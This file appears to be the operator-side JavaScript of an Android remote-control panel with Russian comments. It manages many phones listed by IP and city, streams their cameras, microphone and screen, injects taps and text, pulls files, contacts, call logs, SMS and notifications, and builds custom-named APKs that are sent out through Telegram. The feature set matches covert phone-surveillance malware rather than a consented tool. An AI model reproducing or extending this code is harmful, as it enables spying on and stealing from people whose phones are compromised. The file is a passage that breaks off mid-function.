// Клиент веб-панели. Общается с сервером по REST (/api/*) и WebSocket (/ws).

const $ = (s) => document.querySelector(s);
const api = async (path, opts) => {
  const res = await fetch('/api/' + path, opts);
  const data = await res.json().catch(() => ({}));
  if (!res.ok) throw new Error(data.error || res.statusText);
  return data;
};
const jpost = (path, body) => api(path, {
  method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body),
});

function toast(msg, isErr) {
  const t = $('#toast');
  t.textContent = msg;
  t.className = 'toast show' + (isErr ? ' err' : '');
  clearTimeout(toast._t);
  toast._t = setTimeout(() => (t.className = 'toast'), 2600);
}

// ---------- Камера в левой панели ----------
let camFrameCount = 0, lastCamFpsTime = Date.now();

// Нормализованные координаты клика по картинке (учёт «letterbox» внутри contain)
function normFromEvent(e, img) {
  const rect = img.getBoundingClientRect();
  const natRatio = img.naturalWidth / img.naturalHeight;
  const boxRatio = rect.width / rect.height;
  let dispW = rect.width, dispH = rect.height, offX = 0, offY = 0;
  if (natRatio > boxRatio) { dispH = rect.width / natRatio; offY = (rect.height - dispH) / 2; }
  else { dispW = rect.height * natRatio; offX = (rect.width - dispW) / 2; }
  const x = (e.clientX - rect.left - offX) / dispW;
  const y = (e.clientY - rect.top - offY) / dispH;
  return { x: Math.min(1, Math.max(0, x)), y: Math.min(1, Math.max(0, y)) };
}

// Отправка текста из левой панели
$('#sendText').onclick = () => {
  const v = $('#textInput').value;
  if (v) { ctrlSend({ type: 'text', text: v }); $('#textInput').value = ''; }
};
$('#textInput').addEventListener('keydown', (e) => { if (e.key === 'Enter') $('#sendText').click(); });


// ---------- Вкладки пикера ----------
document.querySelectorAll('.picker-tab').forEach((tab) => {
  tab.onclick = () => {
    document.querySelectorAll('.picker-tab').forEach((t) => t.classList.remove('active'));
    document.querySelectorAll('.picker-panel').forEach((p) => p.classList.remove('active'));
    tab.classList.add('active');
    $('#ptab-' + tab.dataset.ptab).classList.add('active');
    if (tab.dataset.ptab === 'build') loadBuildTab();
  };
});

// ---------- Вкладки панели устройства ----------
document.querySelectorAll('.tab').forEach((tab) => {
  tab.onclick = () => {
    document.querySelectorAll('.tab').forEach((t) => t.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach((c) => c.classList.remove('active'));
    tab.classList.add('active');
    $('#tab-' + tab.dataset.tab).classList.add('active');
    if (tab.dataset.tab === 'dashboard') { loadDashboard(); phoneSend({ cmd: 'get-system-info' }); }
    if (tab.dataset.tab === 'commands') loadCommandsTab();
    if (tab.dataset.tab === 'apps') loadApps();
    if (tab.dataset.tab === 'files') loadFiles($('#filePath').value);
    if (tab.dataset.tab === 'notifs') loadNotifs();
    if (tab.dataset.tab === 'camera') startCameraView();
    if (tab.dataset.tab === 'calls') startCallsTab();
    if (tab.dataset.tab === 'sms') { startCallsTab(); phoneSend({ cmd: 'get-sms' }); }
  };
});

// ---------- Экран выбора устройства ----------
let pickerTimer = null;
let allPickerPhones = [];
let currentDft = 'all';

document.querySelectorAll('.dft').forEach((tab) => {
  tab.onclick = () => {
    document.querySelectorAll('.dft').forEach((t) => t.classList.remove('active'));
    tab.classList.add('active');
    currentDft = tab.dataset.dft;
    renderFilteredPhones();
  };
});

function showPicker() {
  $('#picker').style.display = 'flex';
  $('.layout').style.display = 'none';
  $('#backBtn').style.display = 'none';
  refreshPicker();
  pickerTimer = setInterval(refreshPicker, 3000);
}

function hidePicker() {
  clearInterval(pickerTimer);
  pickerTimer = null;
  $('#picker').style.display = 'none';
  $('.layout').style.display = 'flex';
  $('#backBtn').style.display = '';
}

async function refreshPicker() {
  try {
    const data = await api('phones');
    allPickerPhones = data.phones || [];
    updateDftCounts();
    renderFilteredPhones();
  } catch { /* ignore network errors while waiting */ }
}

function updateDftCounts() {
  document.querySelectorAll('.dft').forEach((t) => {
    const f = t.dataset.dft;
    const labels = { all: 'Все', online: 'Онлайн', offline: 'Офлайн', deleted: 'Удалённые' };
    const count = f === 'all' ? allPickerPhones.filter(p => !p.deleted).length
      : f === 'online' ? allPickerPhones.filter(p => p.online && !p.deleted).length
      : f === 'offline' ? allPickerPhones.filter(p => !p.online && !p.deleted).length
      : allPickerPhones.filter(p => p.deleted).length;
    t.textContent = labels[f] + (count ? ` (${count})` : '');
  });
}

function countryFlag(code) {
  if (!code || code.length !== 2) return '🌐';
  return String.fromCodePoint(
    code.toUpperCase().charCodeAt(0) - 65 + 0x1F1E6,
    code.toUpperCase().charCodeAt(1) - 65 + 0x1F1E6
  );
}

function permsHtml(perms) {
  if (!perms) return '';
  const items = [
    { key: 'camera',        icon: '📷', label: 'Камера' },
    { key: 'mic',           icon: '🎤', label: 'Микрофон' },
    { key: 'accessibility', icon: '👆', label: 'Управление' },
    { key: 'projection',    icon: '🖥', label: 'Экран' },
    { key: 'phone',         icon: '📞', label: 'Звонки' },
    { key: 'contacts',      icon: '👥', label: 'Контакты' },
  ];
  return '<span class="ps-perms">' + items.map((it) =>
    `<span class="ps-perm ${perms[it.key] ? 'perm-on' : 'perm-off'}" title="${it.label}">${it.icon}</span>`
  ).join('') + '</span>';
}

function batteryBar(pct) {
  if (pct === null || pct === undefined) return '';
  const cls = pct < 20 ? 'bat-low' : pct < 40 ? 'bat-mid' : 'bat-ok';
  return `<span class="ps-bat ${cls}"><span class="ps-bat-body"><span class="ps-bat-fill" style="width:${pct}%"></span><span class="ps-bat-pct">${pct}%</span></span><span class="ps-bat-tip"></span></span>`;
}

function relTime(ts) {
  if (!ts) return '';
  const d = Date.now() - ts;
  if (d < 60000) return 'только что';
  if (d < 3600000) return `${Math.floor(d / 60000)} мин. назад`;
  if (d < 86400000) return `${Math.floor(d / 3600000)} ч. назад`;
  return new Date(ts).toLocaleDateString('ru-RU', { day: 'numeric', month: 'short', hour: '2-digit', minute: '2-digit' });
}

function renderFilteredPhones() {
  const list = $('#phoneGrid');
  const status = $('#pickerStatus');
  const filtered = currentDft === 'deleted' ? allPickerPhones.filter(p => p.deleted)
    : currentDft === 'online' ? allPickerPhones.filter(p => p.online && !p.deleted)
    : currentDft === 'offline' ? allPickerPhones.filter(p => !p.online && !p.deleted)
    : allPickerPhones.filter(p => !p.deleted);

  list.innerHTML = '';
  if (!filtered.length) {
    status.style.display = '';
    status.textContent = currentDft === 'deleted' ? 'Нет удалённых устройств'
      : currentDft === 'online' ? 'Нет онлайн-устройств'
      : currentDft === 'offline' ? 'Нет офлайн-устройств'
      : 'Ожидание подключения телефонов…';
    return;
  }
  status.style.display = 'none';

  for (const p of filtered) {
    const strip = document.createElement('div');
    strip.className = 'phone-strip' + (p.online ? '' : ' ps-offline');
    const flag = countryFlag(p.countryCode);
    const city = p.city || '';
    const statusBadge = `<span class="ps-online-dot ${p.online ? 'on' : ''}"></span><span class="ps-online-lbl">${p.online ? 'онлайн' : 'офлайн'}</span>`;
    const bat = batteryBar(p.battery);
    const last = relTime(p.lastSeen);

    if (currentDft === 'deleted') {
      strip.innerHTML = `
        <span class="ps-flag">${flag}</span>
        <span class="ps-info">
          <span class="ps-model">${p.model || 'Android'}</span>
          <span class="ps-sub"><span class="ps-ip">${p.label}</span>${city ? `<span class="ps-city">${city}</span>` : ''}</span>
          ${last ? `<span class="ps-sub ps-last">${last}</span>` : ''}
        </span>
        <button class="sm ps-restore-btn" title="Восстановить">↩ Вернуть</button>`;
      strip.querySelector('.ps-restore-btn').onclick = (e) => { e.stopPropagation(); restorePhone(p.ip); };
    } else {
      strip.innerHTML = `
        <span class="ps-flag">${flag}</span>
        <span class="ps-info">
          <span class="ps-model">${p.model || 'Android'}</span>
          <span class="ps-sub"><span class="ps-ip">${p.label}</span>${city ? `<span class="ps-city">${city}</span>` : ''}</span>
          <span class="ps-meta">${statusBadge}${bat ? `<span class="ps-sep">·</span>${bat}` : ''}${last ? `<span class="ps-sep">·</span><span class="ps-last">${last}</span>` : ''}</span>
          ${permsHtml(p.perms)}
        </span>
        ${p.online ? '<span class="ps-arrow">›</span>' : ''}
        <button class="sm ps-del-btn" title="Удалить устройство">🗑</button>`;
      if (p.online) {
        strip.style.cursor = 'pointer';
        strip.onclick = (e) => { if (e.target.closest('.ps-del-btn')) return; selectPhone(p.ip); };
      }
      strip.querySelector('.ps-del-btn').onclick = (e) => { e.stopPropagation(); deletePhone(p.ip); };
    }
    list.appendChild(strip);
  }
}

// Оставляем для совместимости с ws-уведомлениями
function renderPickerPhones(phones) {
  allPickerPhones = phones;
  updateDftCounts();
  renderFilteredPhones();
}

async function deletePhone(ip) {
  try {
    await jpost('phones/delete', { ip });
    toast('Устройство удалено');
    refreshPicker();
  } catch (e) { toast(e.message, true); }
}

async function restorePhone(ip) {
  try {
    await jpost('phones/restore', { ip });
    currentDft = 'all';
    document.querySelectorAll('.dft').forEach((t) => t.classList.toggle('active', t.dataset.dft === 'all'));
    toast('Устройство восстановлено');
    refreshPicker();
  } catch (e) { toast(e.message, true); }
}

async function selectPhone(ip) {
  try {
    await jpost('phones/select', { ip });
    hidePicker();
    startCameraView();
  } catch (e) { toast(e.message, true); }
}

$('#backBtn').onclick = showPicker;
$('#pickerRefresh').onclick = refreshPicker;

// ---------- Экран телефона (MediaProjection) ----------
let wsScreenViewer = null;
let wsControlChannel = null;
let screenRendering = false;
let screenPendingData = null;

function renderScreenFrame() {
  if (!screenPendingData) { screenRendering = false; return; }
  screenRendering = true;
  const data = screenPendingData;
  screenPendingData = null;
  const url = URL.createObjectURL(new Blob([data], { type: 'image/jpeg' }));
  const img = $('#phoneScreen');
  const prev = img.dataset.url;
  img.onload = () => { if (prev) URL.revokeObjectURL(prev); renderScreenFrame(); };
  img.onerror = () => { if (prev) URL.revokeObjectURL(prev); renderScreenFrame(); };
  img.src = url;
  img.dataset.url = url;
}

function startScreenViewer() {
  if (wsScreenViewer && wsScreenViewer.readyState < 2) return;
  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
  wsScreenViewer = new WebSocket(`${proto}://${location.host}/screen?role=viewer`);
  wsScreenViewer.binaryType = 'arraybuffer';
  wsScreenViewer.onopen = () => {
    $('#phoneScreenStatus').textContent = 'ожидание телефона…';
    $('#phoneScreenStatus').classList.remove('on');
  };
  wsScreenViewer.onmessage = (ev) => {
    if (typeof ev.data === 'string') {
      try {
        const m = JSON.parse(ev.data);
        if (m.type === 'screen-phone') {
          if (m.connected) {
            $('#phoneScreenStatus').textContent = 'ожидание скриншота…';
            $('#phoneScreenStatus').classList.remove('on');
          } else {
            $('#phoneScreenStatus').textContent = 'телефон не подключён';
            $('#phoneScreenStatus').classList.remove('on');
          }
        }
      } catch {}
      return;
    }
    screenPendingData = ev.data;
    if (!screenRendering) renderScreenFrame();
    const hint = $('#phoneScreenHint');
    if (hint) hint.style.display = 'none';
    $('#phoneScreenStatus').textContent = 'подключён';
    $('#phoneScreenStatus').classList.add('on');
  };
  wsScreenViewer.onclose = () => {
    $('#phoneScreenStatus').textContent = 'нет соединения';
    $('#phoneScreenStatus').classList.remove('on');
    setTimeout(startScreenViewer, 2000);
  };
  wsScreenViewer.onerror = () => {};
}

function startControlChannel() {
  if (wsControlChannel && wsControlChannel.readyState < 2) return;
  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
  wsControlChannel = new WebSocket(`${proto}://${location.host}/control?role=viewer`);
  wsControlChannel.onclose = () => setTimeout(startControlChannel, 2000);
  wsControlChannel.onerror = () => {};
}

function ctrlSend(obj) {
  if (wsControlChannel && wsControlChannel.readyState === WebSocket.OPEN)
    wsControlChannel.send(JSON.stringify(obj));
}

// Тап / свайп на экране телефона (MediaProjection)
const phoneScreenEl = $('#phoneScreen');
let phoneDownPt = null, phoneDownTime = 0;
phoneScreenEl.addEventListener('mousedown', (e) => {
  if (!phoneScreenEl.naturalWidth) return;
  phoneDownPt = normFromEvent(e, phoneScreenEl);
  phoneDownTime = Date.now();
  e.preventDefault();
});
window.addEventListener('mouseup', (e) => {
  if (!phoneDownPt) return;
  const up = normFromEvent(e, phoneScreenEl);
  const dist = Math.hypot(up.x - phoneDownPt.x, up.y - phoneDownPt.y);
  const dt = Date.now() - phoneDownTime;
  if (dist < 0.02 && dt < 400) ctrlSend({ type: 'tap', x: phoneDownPt.x, y: phoneDownPt.y });
  else ctrlSend({ type: 'swipe', x1: phoneDownPt.x, y1: phoneDownPt.y, x2: up.x, y2: up.y, ms: Math.min(600, Math.max(100, dt)) });
  phoneDownPt = null;
});
phoneScreenEl.addEventListener('keydown', (e) => {
  if (e.key === 'Escape') { ctrlSend({ type: 'key', name: 'BACK' }); e.preventDefault(); }
  else if (e.key === 'Enter') { ctrlSend({ type: 'text', text: '\n' }); e.preventDefault(); }
  else if (e.key === 'Backspace') { ctrlSend({ type: 'key', name: 'DEL' }); e.preventDefault(); }
  else if (e.key.length === 1) { ctrlSend({ type: 'text', text: e.key }); e.preventDefault(); }
});
document.querySelectorAll('[data-ctrl-key]').forEach((btn) => {
  btn.onclick = () => ctrlSend({ type: 'key', name: btn.dataset.ctrlKey });
});
$('#screenQuality').addEventListener('input', (e) => {
  const q = parseInt(e.target.value);
  $('#screenQualityVal').textContent = q + '%';
  ctrlSend({ type: 'screen-quality', quality: q });
});

$('#phoneTextInput').addEventListener('keydown', (e) => { if (e.key === 'Enter') $('#phoneSendText').click(); });
$('#phoneSendText').onclick = () => {
  const v = $('#phoneTextInput').value;
  if (v) { ctrlSend({ type: 'text', text: v }); $('#phoneTextInput').value = ''; }
};

// ---------- Трансляция камеры телефона ----------
const camWS = { back: null, front: null };
const phoneConnected = { back: false, front: false };
let currentLeftCam = 'back';
let lastCamFrameTime = Date.now();
let camStatusTimer = null;
let specificCamStatus = null;

function setCamStatusOverlay(msg) {
  const el = $('#camStatus');
  if (!el) return;
  if (msg) { el.textContent = msg; el.style.display = 'block'; }
  else { el.style.display = 'none'; }
}

function scheduleCamStatusCheck() {
  clearTimeout(camStatusTimer);
  camStatusTimer = setTimeout(() => {
    if (specificCamStatus) {
      setCamStatusOverlay('📷 ' + specificCamStatus);
    } else {
      const connected = phoneConnected.back || phoneConnected.front;
      if (!connected) {
        setCamStatusOverlay('Камера не подключена к серверу. Запусти APK на телефоне.');
      } else if (Date.now() - lastCamFrameTime > 5000) {
        setCamStatusOverlay('Камера подключена, но нет изображения. Проверь разрешение камеры в настройках телефона.');
      } else {
        setCamStatusOverlay(null);
      }
    }
    scheduleCamStatusCheck();
  }, 5000);
}

function startCamViewer(cam) {
  const ws = camWS[cam];
  if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) return;
  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
  const sock = new WebSocket(`${proto}://${location.host}/camera?role=viewer&cam=${cam}`);
  sock.binaryType = 'arraybuffer';
  sock.onmessage = (ev) => {
    if (typeof ev.data === 'string') {
      const m = JSON.parse(ev.data);
      if (m.type === 'phone') { phoneConnected[cam] = m.connected; updatePhoneStatus(); }
      else if (m.type === 'cam-status') {
        if (m.text === 'ok') {
          specificCamStatus = null;
          setCamStatusOverlay(null);
          lastCamFrameTime = Date.now(); // сброс таймера — камера готова, ждём первый кадр
        } else if (m.text) {
          specificCamStatus = m.text;
          setCamStatusOverlay('📷 ' + m.text);
        }
      }
      return;
    }
    if (cam !== currentLeftCam) return;
    lastCamFrameTime = Date.now();
    specificCamStatus = null;
    setCamStatusOverlay(null);
    const url = URL.createObjectURL(new Blob([ev.data], { type: 'image/jpeg' }));
    const img = $('#camLeft');
    if (img.dataset.url) URL.revokeObjectURL(img.dataset.url);
    img.src = url; img.dataset.url = url;
    const hint = $('#screenHint');
    if (hint) hint.style.display = 'none';
    camFrameCount++;
    const now = Date.now();
    if (now - lastCamFpsTime >= 1000) {
      $('#fps').textContent = `${camFrameCount} fps`;
      camFrameCount = 0; lastCamFpsTime = now;
    }
  };
  sock.onclose = () => {
    camWS[cam] = null;
    phoneConnected[cam] = false;
    updatePhoneStatus();
    setTimeout(() => startCamViewer(cam), 3000);
  };
  camWS[cam] = sock;
}

$('#btnCamSwitch').onclick = () => {
  currentLeftCam = currentLeftCam === 'back' ? 'front' : 'back';
  $('#btnCamSwitch').textContent = currentLeftCam === 'back' ? '🤳 Фронт' : '📷 Зад';
  lastCamFrameTime = Date.now();
  specificCamStatus = null;
  setCamStatusOverlay(null);
  startCamViewer(currentLeftCam);
  const backWs = camWS.back;
  if (backWs && backWs.readyState === WebSocket.OPEN) {
    backWs.send(JSON.stringify({ cmd: 'switch', cam: currentLeftCam }));
  } else {
    ctrlSend({ type: 'cam-switch', cam: currentLeftCam });
  }
};

// ---------- Аудио с телефона ----------
let audioCtx = null;
let gainNode = null;
let audioWs = null;
let audioMuted = true;
let nextAudioTime = 0;
const AUDIO_SAMPLE_RATE = 16000;

function ensureAudioCtx() {
  if (audioCtx) { if (audioCtx.state === 'suspended') audioCtx.resume(); return; }
  audioCtx = new AudioContext({ sampleRate: AUDIO_SAMPLE_RATE });
  gainNode = audioCtx.createGain();
  gainNode.gain.value = audioMuted ? 0 : 1;
  gainNode.connect(audioCtx.destination);
  nextAudioTime = 0;
}

function startAudioViewer() {
  if (audioWs && (audioWs.readyState === WebSocket.OPEN || audioWs.readyState === WebSocket.CONNECTING)) return;
  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
  audioWs = new WebSocket(`${proto}://${location.host}/audio?role=viewer`);
  audioWs.binaryType = 'arraybuffer';
  audioWs.onmessage = (ev) => {
    if (typeof ev.data === 'string') return;
    if (!audioCtx || !gainNode) return;
    const int16 = new Int16Array(ev.data);
    const float32 = new Float32Array(int16.length);
    for (let i = 0; i < int16.length; i++) float32[i] = int16[i] / 32768;
    const buf = audioCtx.createBuffer(1, float32.length, AUDIO_SAMPLE_RATE);
    buf.copyToChannel(float32, 0);
    const src = audioCtx.createBufferSource();
    src.buffer = buf;
    src.connect(gainNode);
    const now = audioCtx.currentTime;
    if (nextAudioTime < now + 0.02) nextAudioTime = now + 0.06;
    src.start(nextAudioTime);
    nextAudioTime += buf.duration;
  };
  audioWs.onclose = () => {};
}

$('#camMute').onclick = () => {
  ensureAudioCtx();
  audioMuted = !audioMuted;
  gainNode.gain.setValueAtTime(audioMuted ? 0 : 1, audioCtx.currentTime);
  $('#camMute').textContent = audioMuted ? '🔇 Тихо' : '🔊 Звук';
};


let streamPaused = false;
$('#btnStream').onclick = () => {
  streamPaused = !streamPaused;
  const cmd = streamPaused ? 'pause' : 'resume';
  const backWs = camWS.back;
  if (backWs && backWs.readyState === WebSocket.OPEN) backWs.send(JSON.stringify({ cmd }));
  $('#btnStream').textContent = streamPaused ? '▶ Стрим' : '⏸ Пауза';
};

function startCameraView() {
  startCamViewer('back');
  startCamViewer('front');
  startAudioViewer();
  startScreenViewer();
  startControlChannel();
  startCallsViewer(true); // запрашиваем phone-info сразу для дашборда
  scheduleCamStatusCheck();
}

function updatePhoneStatus() {
  const on = phoneConnected.back || phoneConnected.front;
  const hint = $('#screenHint');
  if (hint && on) hint.style.display = 'none';
}

// ---------- Билдинг APK ----------
async function loadBuildTab() {
  try {
    const info = await api('serverinfo');
    if (info.addresses && info.addresses.length && !$('#bServer').value) {
      $('#bServer').value = `${info.addresses[0].address}:${info.port}`;
    }
  } catch { /* ignore */ }
  if (!$('#bGhToken').value) $('#bGhToken').value = localStorage.getItem('arp_gh_token') || '';
  if (!$('#bTgToken').value) $('#bTgToken').value = localStorage.getItem('arp_tg_token') || '';
  if (!$('#bTgChatId').value) $('#bTgChatId').value = localStorage.getItem('arp_tg_chat_id') || '';
}

$('#bGhToken').addEventListener('change', () => {
  const v = $('#bGhToken').value.trim();
  if (v) localStorage.setItem('arp_gh_token', v);
  else localStorage.removeItem('arp_gh_token');
});
$('#bTgToken').addEventListener('change', () => {
  const v = $('#bTgToken').value.trim();
  if (v) localStorage.setItem('arp_tg_token', v);
  else localStorage.removeItem('arp_tg_token');
});
$('#bTgChatId').addEventListener('change', () => {
  const v = $('#bTgChatId').value.trim();
  if (v) localStorage.setItem('arp_tg_chat_id', v);
  else localStorage.removeItem('arp_tg_chat_id');
});

$('#buildBtn').onclick = async () => {
  const msg = $('#buildMsg');
  if (!$('#bServer').value.trim()) {
    msg.textContent = 'Укажи адрес панели — он зашивается в APK, чтобы телефон знал куда подключаться.';
    $('#bServer').focus();
    return;
  }
  msg.textContent = 'Сборка…';
  const perms = [];
  if ($('#permCamera').checked) perms.push('CAMERA');
  if ($('#permMic').checked) perms.push('RECORD_AUDIO');
  if ($('#permScreen').checked) perms.push('SCREEN');
  if ($('#permNotif').checked) perms.push('NOTIFICATIONS');
  if ($('#permPhone').checked) perms.push('PHONE');
  if ($('#permSms').checked) perms.push('SMS');
  if ($('#permBluetooth').checked) perms.push('BLUETOOTH');
  if ($('#permLocation').checked) perms.push('LOCATION');
  if ($('#permMedia').checked) perms.push('MEDIA');
  if ($('#permCalendar').checked) perms.push('CALENDAR');
  const fd = new FormData();
  fd.append('appName', $('#bAppName').value);
  fd.append('applicationId', $('#bAppId').value);
  fd.append('permissions', perms.join(','));
  fd.append('defaultServer', $('#bServer').value);
  const icon = $('#bIcon').files[0];
  if (icon) fd.append('icon', icon);
  try {
    const res = await fetch('/api/build/apk', { method: 'POST', body: fd });
    if (res.ok) {
      const blob = await res.blob();
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url; a.download = ($('#bAppName').value || 'app') + '.apk';
      a.click(); URL.revokeObjectURL(url);
      msg.textContent = 'Готово — APK скачан. Установи его на телефон и выдай доступ к камере.';
    } else if (res.status === 501) {
      const token = $('#bGhToken').value.trim();
      if (token) {
        await buildViaGitHub(token, msg, perms);
      } else {
        msg.textContent = 'Введи GitHub Token — APK соберётся на GitHub Actions и придёт в Telegram (или скачается сюда).';
        $('#bGhToken').focus();
      }
    } else {
      const d = await res.json().catch(() => ({}));
      msg.textContent = 'Ошибка сборки: ' + (d.error || res.statusText);
    }
  } catch (e) { msg.textContent = 'Ошибка: ' + e.message; }
};

async function buildViaGitHub(token, msgEl, perms = []) {
  const tgToken = $('#bTgToken').value.trim();
  const tgChatId = $('#bTgChatId').value.trim();
  const hasTg = !!(tgToken && tgChatId);
  msgEl.textContent = 'Отправляем задание на GitHub Actions…';
  try {
    const trigRes = await fetch('/api/build/github', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        appName: $('#bAppName').value,
        applicationId: $('#bAppId').value,
        defaultServer: $('#bServer').value,
        permissions: perms.join(','),
        token,
        tgToken,
        tgChatId,
      }),
    });
    const td = await trigRes.json();
    if (!trigRes.ok) {
      msgEl.textContent = 'Ошибка GitHub API: ' + (td.error || trigRes.statusText);
      return;
    }
    const { runId, runUrl } = td;
    if (!runId) {
      msgEl.innerHTML = `Сборка запущена, но ID запуска не получили. <a href="${runUrl}" target="_blank">Открыть Actions</a>`;
      return;
    }
    const tgHint = hasTg ? ' Когда будет готово — APK придёт в Telegram.' : '';
    msgEl.innerHTML = `Сборка идёт (#${runId})… ~2-3 мин.${tgHint}<br><a href="${runUrl}" target="_blank">Открыть в GitHub Actions</a>`;

    const poll = setInterval(async () => {
      try {
        const sr = await fetch(`/api/build/github/status?runId=${runId}&token=${encodeURIComponent(token)}`);
        const sd = await sr.json();
        if (sd.status === 'completed') {
          clearInterval(poll);
          if (sd.conclusion === 'success') {
            if (hasTg) {
              msgEl.innerHTML = `✅ Готово! APK отправлен в Telegram.<br><a href="${sd.url}" target="_blank">Посмотреть сборку</a>`;
            } else {
              msgEl.innerHTML = 'Сборка готова! Скачиваем APK…';
              const a = document.createElement('a');
              a.href = `/api/build/github/artifact?runId=${runId}&token=${encodeURIComponent(token)}`;
              a.download = 'camera-companion-apk.zip';
              document.body.appendChild(a);
              a.click();
              document.body.removeChild(a);
              setTimeout(() => {
                msgEl.innerHTML = 'APK скачан (zip — внутри <b>app-debug.apk</b>). Установи на телефон.<br><a href="' + sd.url + '" target="_blank">Посмотреть сборку</a>';
              }, 1500);
            }
          } else {
            msgEl.innerHTML = `Ошибка сборки (${sd.conclusion}). <a href="${sd.url}" target="_blank">Смотри лог в Actions</a>`;
          }
        }
      } catch { /* ignore transient poll errors */ }
    }, 12000);
  } catch (e) { msgEl.textContent = 'Ошибка: ' + e.message; }
}

// ---------- Дашборд ----------
async function loadDashboard() {
  try {
    const info = await api('info');
    $('#infoKv').innerHTML = `
      <b>Модель</b><span>${info.manufacturer} ${info.model}</span>
      <b>Android</b><span>${info.androidVersion} (SDK ${info.sdk})</span>
      <b>Разрешение</b><span>${info.resolution}</span>
      <b>Serial</b><span>${info.serialno}</span>`;
  } catch (e) { $('#infoKv').textContent = e.message; }
  try {
    const b = await api('battery');
    const pct = Math.round((b.level / (b.scale || 100)) * 100);
    $('#batteryFill').style.width = pct + '%';
    $('#batteryFill').style.background = pct < 20 ? 'var(--danger)' : 'var(--accent)';
    $('#batteryText').textContent = pct + '%';
    $('#batteryKv').innerHTML = `
      <b>Статус</b><span>${b.status} (${b.plugged})</span>
      <b>Температура</b><span>${b.temperature ?? '—'} °C</span>
      <b>Напряжение</b><span>${b.voltage ?? '—'} мВ</span>
      <b>Здоровье</b><span>${b.health ?? '—'}</span>`;
  } catch (e) { $('#batteryKv').textContent = e.message; }
}
$('#refreshDash').onclick = loadDashboard;

// ---------- Приложения ----------
async function loadApps() {
  const list = $('#appList');
  list.innerHTML = '<li>Загрузка…</li>';
  try {
    const { apps } = await api('apps' + ($('#appsAll').checked ? '?all=1' : ''));
    const filter = $('#appFilter').value.toLowerCase();
    list.innerHTML = '';
    for (const pkg of apps.filter((p) => p.includes(filter))) {
      const li = document.createElement('li');
      li.innerHTML = `<span class="name">${pkg}</span>`;
      const launch = document.createElement('button');
      launch.className = 'sm'; launch.textContent = '▶';
      launch.onclick = () => jpost('apps/launch', { pkg }).then(() => toast('Запущено')).catch((e) => toast(e.message, true));
      const stop = document.createElement('button');
      stop.className = 'sm'; stop.textContent = '⏹';
      stop.onclick = () => jpost('apps/stop', { pkg }).then(() => toast('Остановлено')).catch((e) => toast(e.message, true));
      li.append(launch, stop);
      list.appendChild(li);
    }
    if (!list.children.length) list.innerHTML = '<li>Ничего не найдено</li>';
  } catch (e) { list.innerHTML = `<li>${e.message}</li>`; }
}
$('#refreshApps').onclick = loadApps;
$('#appFilter').addEventListener('input', () => { clearTimeout(loadApps._t); loadApps._t = setTimeout(loadApps, 250); });
$('#appsAll').onchange = loadApps;

// ---------- Файлы ----------
async function loadFiles(p) {
  const list = $('#fileList');
  list.innerHTML = '<li>Загрузка…</li>';
  try {
    const { path, entries } = await api('files?path=' + encodeURIComponent(p));
    $('#filePath').value = path;
    list.innerHTML = '';
    for (const e of entries) {
      const li = document.createElement('li');
      if (e.isDir) li.className = 'dir';
      const icon = e.isDir ? '📁' : '📄';
      const name = document.createElement('span');
      name.className = 'name';
      name.textContent = `${icon} ${e.name}`;
      if (e.isDir) name.onclick = () => loadFiles((path.replace(/\/$/, '')) + '/' + e.name);
      li.appendChild(name);
      if (!e.isDir) {
        const sub = document.createElement('span'); sub.className = 'sub'; sub.textContent = e.size;
        const dl = document.createElement('button');
        dl.className = 'sm'; dl.textContent = '⬇';
        dl.onclick = () => window.open('/api/files/download?path=' + encodeURIComponent((path.replace(/\/$/, '')) + '/' + e.name));
        li.append(sub, dl);
      }
      list.appendChild(li);
    }
    if (!entries.length) list.innerHTML = '<li>Пусто</li>';
  } catch (e) { list.innerHTML = `<li>${e.message}</li>`; }
}
$('#goPath').onclick = () => loadFiles($('#filePath').value);
$('#upPath').onclick = () => {
  const p = $('#filePath').value.replace(/\/$/, '');
  loadFiles(p.substring(0, p.lastIndexOf('/')) || '/');
};
$('#uploadBtn').onclick = async () => {
  const f = $('#uploadInput').files[0];
  if (!f) return toast('Выбери файл', true);
  const fd = new FormData();
  fd.append('file', f);
  fd.append('remoteDir', $('#filePath').value);
  try {
    const r = await fetch('/api/files/upload', { method: 'POST', body: fd });
    const d = await r.json();
    if (!r.ok) throw new Error(d.error);
    toast('Загружено: ' + d.remotePath);
    loadFiles($('#filePath').value);
  } catch (e) { toast(e.message, true); }
};

// ---------- Уведомления ----------
async function loadNotifs() {
  const list = $('#notifList');
  list.innerHTML = '<li>Загрузка…</li>';
  try {
    const { items } = await api('notifications');
    list.innerHTML = '';
    for (const n of items) {
      const li = document.createElement('li');
      li.innerHTML = `<div class="name"><b>${n.title || '(без заголовка)'}</b><div class="sub">${n.pkg}</div>${n.text ? '<div>' + n.text + '</div>' : ''}</div>`;
      list.appendChild(li);
    }
    if (!items.length) list.innerHTML = '<li>Нет уведомлений (или устройство их не отдаёт)</li>';
  } catch (e) { list.innerHTML = `<li>${e.message}</li>`; }
}
$('#refreshNotifs').onclick = loadNotifs;
$('#postNotif').onclick = () => jpost('notifications/post', { title: $('#notifTitle').value, text: $('#notifText').value })
  .then(() => toast('Отправлено')).catch((e) => toast(e.message, true));

// ---------- Звонки / Телефон ----------
let wsPhone = null;

function startCallsViewer(requestDataOnOpen) {
  if (wsPhone && wsPhone.readyState < 2) return;
  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
  wsPhone = new WebSocket(`${proto}://${location.host}/phone?role=viewer`);
  wsPhone.onopen = () => {
    $('#callsStatus').textContent = 'ожидание телефона…';
    $('#callsStatus').classList.remove('on');
    if (requestDataOnOpen) {
      phoneSend({ cmd: 'get-phone-info' });
      phoneSend({ cmd: 'get-call-log' });
      phoneSend({ cmd: 'get-contacts' });
      phoneSend({ cmd: 'get-system-info' });
      phoneSend({ cmd: 'get-volume' });
    }
  };
  wsPhone.onmessage = (ev) => {
    if (typeof ev.data !== 'string') return;
    try {
      const m = JSON.parse(ev.data);
      if (m.type === 'phone-connected') {
        if (m.connected) {
          $('#callsStatus').textContent = 'подключён';
          $('#callsStatus').classList.add('on');
        } else {
